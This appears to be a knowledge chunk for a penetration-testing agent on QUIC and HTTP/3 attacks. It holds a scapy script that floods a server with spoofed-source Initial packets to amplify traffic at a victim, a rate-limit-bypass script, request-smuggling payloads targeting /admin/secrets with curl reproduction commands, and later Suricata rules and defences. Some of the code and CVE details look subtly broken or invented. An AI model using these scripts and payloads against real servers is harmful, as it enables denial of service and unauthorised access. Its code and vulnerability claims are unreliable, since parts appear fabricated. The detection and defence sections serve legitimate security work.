# QUIC & HTTP/3 Attacks — Agent Chunk 73b
> Source: QUIC RFC 9000, HTTP/3 RFC 9114, quic-go Security Advisories, Suricata QUIC Detection Documentation
> Purpose: Understand QUIC-specific attack vectors including amplification DoS, connection migration abuse, HTTP/3-to-HTTP/1 translation smuggling, and practical detection and defense mechanisms
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing HTTP/3-enabled targets, check for QUIC amplification via spoofed source IPs, connection migration abuse to bypass middlebox state, and HTTP/3-to-HTTP/1 translation smuggling at proxy boundaries. Verify that address validation tokens and Retry packets are implemented. Use curl --http3, quiche, or aioquic for QUIC-level testing. Check for quic-go CVEs if the target uses Go-based infrastructure.

---

## 1. QUIC Amplification DoS

### 1.1 The 3x Amplification Limit

RFC 9000 Section 8.1 mandates that a QUIC server MUST NOT send more than three times the data it has received before the client's address is validated. This is the anti-amplification limit. However, implementation bugs and configuration errors can bypass this limit.

### 1.2 Amplification Beyond 3x

**Attack:** An attacker sends a minimal QUIC Initial packet (1200 bytes minimum per RFC) with a spoofed source IP. The server responds with its Initial packet, Handshake packet, and potentially 0-RTT data — up to 3x the received data (3600 bytes). With implementation bugs, the amplification can exceed 3x.

```python
# Conceptual QUIC amplification test
from scapy.all import *
from scapy.layers.quic import *

# Craft minimal QUIC Initial packet with spoofed source
initial = (
    IP(src="victim.ip", dst="quic-server.com") /
    UDP(sport=443, dport=443) /
    QUIC_Initial(
        version=0x00000001,
        dcid=bytes(8),          # Random DCID
        scid=bytes(0),
        token=b'',
        length=1200,
        payload=bytes(1200)     # Padding to minimum size
    )
)

# Send 1000 packets — server responds with up to 3x each to victim
send(initial, count=1000)
# Victim receives up to 3.6 MB from a 1.2 MB attack
```

### 1.3 Bypassing the 3x Limit

**Server-side misconfigurations that amplify beyond 3x:**

1. **Large certificate chains:** Server sends multi-kilobyte certificate chains in the handshake, exceeding 3x before address validation completes.
2. **0-RTT data:** Servers that send 0-RTT responses (e.g., cached content) before address validation.
3. **Token-based validation bugs:** Some implementations issue large address validation tokens that inflate the response.

```bash
# Test amplification ratio
# Send 1200-byte Initial, measure response size
# If response > 3600 bytes before address validation, server is vulnerable

# Using aioquic for controlled testing
python3 -c "
import asyncio
from aioquic.quic.configuration import QuicConfiguration
from aioquic.asyncio import connect

async def test():
    config = QuicConfiguration(is_client=True)
    config.verify_mode = False
    async with connect('target.com', 443, configuration=config) as protocol:
        print(f'Handshake bytes received: {protocol._quic._bytes_received}')
        print(f'Amplification ratio: {protocol._quic._bytes_received / 1200:.1f}x')

asyncio.run(test())
"
```

## 2. Initial Handshake Flooding

### 2.1 The Attack

QUIC Initial packets trigger cryptographic operations (TLS 1.3 handshake) on the server. An attacker floods the server with Initial packets, each requiring the server to perform expensive cryptographic computations.

```
Attacker → Initial (random DCID) → Server computes TLS handshake
Attacker → Initial (random DCID) → Server computes TLS handshake
Attacker → Initial (random DCID) → Server computes TLS handshake
... thousands per second

# Each Initial with a new DCID creates a new connection state
# Server exhausts CPU on TLS operations and memory on connection state
```

### 2.2 Comparison to TCP SYN Flood

Unlike TCP SYN floods (mitigated by SYN cookies), QUIC Initial floods require the server to perform full TLS operations. QUIC does have a Retry mechanism (analogous to SYN cookies), but it is not mandatory and not all implementations enable it by default.

## 3. Connection Migration Disrupting Middlebox State

### 3.1 How QUIC Connection Migration Works

QUIC connections are identified by Connection IDs (CIDs), not by the 4-tuple (src IP, src port, dst IP, dst port). A client can migrate to a new IP address or port while maintaining the same QUIC connection.

### 3.2 Middlebox State Confusion

```
# Initial connection
Client (IP: 1.2.3.4, Port: 50000) → Firewall → Server
Firewall state: Allow 1.2.3.4:50000 ↔ Server

# Connection migration (same CID, new 4-tuple)
Client (IP: 5.6.7.8, Port: 60000) → Firewall → Server
Firewall state: No entry for 5.6.7.8:60000 → ???

# Possible outcomes:
# 1. Firewall drops migrated packets (connection breaks)
# 2. Firewall creates new state (bypasses per-IP rate limits)
# 3. Firewall applies different policy for new IP (policy bypass)
```

### 3.3 Rate Limit Bypass via Migration

```python
# Exploit connection migration to reset rate limits
import asyncio
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration

async def migrate_and_request():
    config = QuicConfiguration(is_client=True)
    
    async with connect('target.com', 443, configuration=config) as protocol:
        # Send requests until rate-limited
        for i in range(100):
            stream_id = protocol._quic.get_next_available_stream_id()
            protocol._quic.send_stream_data(stream_id, b'GET /api/data HTTP/3\r\n')
        
        # Trigger connection migration by binding to new local address
        # Rate limit counter may reset because middlebox sees new source
        protocol._quic.change_connection_id()
        # Continue sending from "new" connection identity
```

## 4. HTTP/3-to-HTTP/1 Translation Smuggling — CVE-2026-48743

### 4.1 Vulnerability (CVSS 7.5)

When a proxy terminates HTTP/3 and forwards requests to an HTTP/1.1 backend, the translation from QUIC frames to HTTP/1.1 text format introduces smuggling opportunities.

**Key differences:**
- HTTP/3 uses QPACK (not HPACK) for header compression
- HTTP/3 has no equivalent of `transfer-encoding` or `content-length` at the framing level — message boundaries are determined by QUIC stream framing
- HTTP/1.1 relies on `content-length` or `transfer-encoding: chunked` for message boundaries

### 4.2 Attack Payloads

```
# HTTP/3 request (QUIC stream framing determines boundaries)
:method = POST
:path = /api/search
content-length: 0

BODY (QUIC DATA frame contains this):
GET /admin/secrets HTTP/1.1
Host: target.com

# Proxy translates to HTTP/1.1:
POST /api/search HTTP/1.1
Host: target.com
Content-Length: 0

GET /admin/secrets HTTP/1.1      ← Smuggled request
Host: target.com
```

### 4.3 Reproduction

```bash
# Using curl with HTTP/3 support
curl --http3-only \
  -X POST \
  -H "Content-Length: 0" \
  -d 'GET /admin/secrets HTTP/1.1
Host: target.com
' \
  https://target.com/api/search

# Using quiche (Cloudflare's QUIC implementation)
cargo install quiche
quiche-client --http3 https://target.com/ \
  --body "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

## 5. quic-go CVEs

### 5.1 CVE-2025-64702 (CVSS 7.5)

**Vulnerability:** quic-go (widely used Go QUIC library) failed to properly validate PATH_CHALLENGE frames during connection migration, allowing an off-path attacker to force a connection to migrate to an attacker-controlled address.

```go
// Affected: quic-go < v0.48.2
// Attack: Send PATH_CHALLENGE from spoofed address
// Server responds with PATH_RESPONSE to attacker's address
// Connection migrates to attacker's address
// Attacker receives all subsequent data
```

**Fix:** Update quic-go to >= v0.48.2.

### 5.2 CVE-2025-59530 (CVSS 7.5)

**Vulnerability:** quic-go's flow control implementation allowed a client to send more data than the server's advertised flow control window by exploiting a race condition in window update processing.

```go
// Affected: quic-go < v0.49.0
// Attack: Send DATA frames faster than flow control updates propagate
// Server buffers excess data → memory exhaustion → DoS
```

**Impact:** Memory exhaustion DoS against any Go service using quic-go.
**Fix:** Update quic-go to >= v0.49.0.

## 6. Detection with Suricata

### 6.1 QUIC Protocol Detection

```yaml
# suricata.yaml — enable QUIC detection
app-layer:
  protocols:
    quic:
      enabled: yes

# Suricata rules for QUIC attacks
# Detect QUIC amplification (high Initial packet rate from single source)
alert quic any any -> any any (msg:"QUIC Amplification - High Initial Rate"; \
  quic.version; content:"|00 00 00 01|"; \
  threshold: type both, track by_src, count 100, seconds 1; \
  classtype:attempted-dos; sid:3000001; rev:1;)

# Detect connection migration abuse
alert quic any any -> any any (msg:"QUIC Connection Migration Anomaly"; \
  flow:to_server; \
  quic.cid; \
  threshold: type both, track by_src, count 10, seconds 5; \
  classtype:policy-violation; sid:3000002; rev:1;)

# Detect HTTP/3 smuggling indicators
alert http3 any any -> any any (msg:"HTTP/3 CL Mismatch Smuggling"; \
  http.header; content:"content-length|3a| 0"; \
  http.request_body; content:!""; \
  classtype:web-application-attack; sid:3000003; rev:1;)
```

### 6.2 Network-Level Monitoring

```bash
# Capture QUIC traffic with tshark
tshark -i eth0 -f "udp port 443" -Y "quic" -T fields \
  -e ip.src -e quic.dcid -e quic.packet_type -e frame.len

# Monitor for amplification
tshark -i eth0 -f "udp port 443" -Y "quic.packet_type == 0" \
  -T fields -e ip.src -e frame.len | \
  awk '{bytes[$1]+=$2; count[$1]++} END {for (ip in bytes) print ip, count[ip], bytes[ip]}'
```

## 7. Defense

### 7.1 Address Validation Tokens

```
# Server sends Retry packet with address validation token
Client → Initial → Server
Server → Retry (token=<encrypted(client_ip, timestamp)>) → Client
Client → Initial (token=<token>) → Server validates → proceeds with handshake

# This proves the client owns the source IP, preventing spoofed amplification
```

### 7.2 Retry Packets

Enable Retry for all new connections to prevent amplification and Initial flood:

```go
// quic-go configuration
server := &quic.Server{
    Config: &quic.Config{
        RequireAddressValidation: func(net.Addr) bool {
            return true  // Require Retry for all new connections
        },
    },
}
```

### 7.3 Additional Defenses

1. **Enforce 3x amplification limit:** Audit QUIC implementation to ensure strict compliance.
2. **Rate-limit Initial packets:** Apply per-source-IP rate limiting on QUIC Initial packets.
3. **Validate connection migration:** Require PATH_CHALLENGE/PATH_RESPONSE validation before accepting migrated connections.
4. **Normalize HTTP/3-to-HTTP/1 translation:** Strip `content-length` and `transfer-encoding` headers during protocol translation; use frame boundaries only.
5. **Update quic-go:** Patch CVE-2025-64702 and CVE-2025-59530.
